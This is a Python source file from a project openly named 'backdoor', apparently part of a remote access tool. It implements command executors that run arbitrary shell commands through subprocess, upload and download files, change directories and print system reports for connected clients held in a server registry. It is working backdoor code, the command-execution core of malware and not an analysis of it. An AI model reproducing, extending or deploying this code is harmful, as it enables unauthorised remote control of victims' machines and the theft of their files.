import os
import subprocess
from typing import Protocol

from backdoor.exceptions.core import InvalidArgumentException
from backdoor.files.processor import FileProcessor
from backdoor.models.commands import Command, LocalCommand, RemoteCommand, CommandResult
from backdoor.server.registry import ClientRegistry
from backdoor.utils.systemreport import format_report


class CommandExecutor(Protocol):

    def execute(self, command: Command) -> CommandResult: ...

    def delegate_execute(self, command: Command) -> CommandResult:
        try:
            result = subprocess.run(
                [command.command, *(command.args or [])], capture_output=True, text=True
            )
            return CommandResult(
                success=result.returncode == 0,
                returncode=result.returncode,
                stdout=result.stdout,
                stderr=result.stderr,
            )
        except FileNotFoundError:
            return CommandResult(
                success=False,
                returncode=127,
                stderr=f"command not found: {command.command}",
            )


class LocalCommandExecutor(CommandExecutor):

    def __init__(self, registry: ClientRegistry) -> None:
        self.registry = registry

    def execute(self, command: Command) -> CommandResult:
        try:
            return self.__try_execute(command)
        except Exception as e:
            return CommandResult(
                success=False,
                returncode=1,
                stderr=str(e) or "Could not execute command",
            )

    def __try_execute(self, command: Command) -> CommandResult:
        match command:
            case LocalCommand(command="systemreport"):
                client = self.registry.current_client
                if not client or not client.report:
                    return CommandResult(
                        success=False,
                        returncode=1,
                        stderr="Could not print report to current client",
                    )
                return CommandResult(
                    success=True,
                    returncode=0,
                    stdout=format_report(client.report),
                )
            case _:
                return self.delegate_execute(command)


class RemoteCommandExecutor(CommandExecutor):

    def __init__(self, file_processor: FileProcessor) -> None:
        self.file_processor = file_processor

    def execute(self, command: Command) -> CommandResult:
        try:
            return self.__try_execute(command)
        except Exception as e:
            return CommandResult(
                success=False,
                returncode=1,
                stderr=str(e) or "Could not execute command",
            )

    def __try_execute(self, command: Command) -> CommandResult:
        match command:
            case RemoteCommand(command="download"):
                return self.file_processor.download(command)
            case RemoteCommand(command="upload"):
                return self.file_processor.upload(command)
            case RemoteCommand(command="cd"):
                return self.__chdir(command)
            case _:
                return self.delegate_execute(command)

    def __chdir(self, command: RemoteCommand) -> CommandResult:
        if not command.args:
            raise InvalidArgumentException("file path not provided")
        path = command.args[0]
        path = os.path.abspath(path)
        try:
            os.chdir(path)
        except FileNotFoundError:
            raise InvalidArgumentException("no such file or directory")
        return CommandResult(success=True, returncode=0, stdout=path)
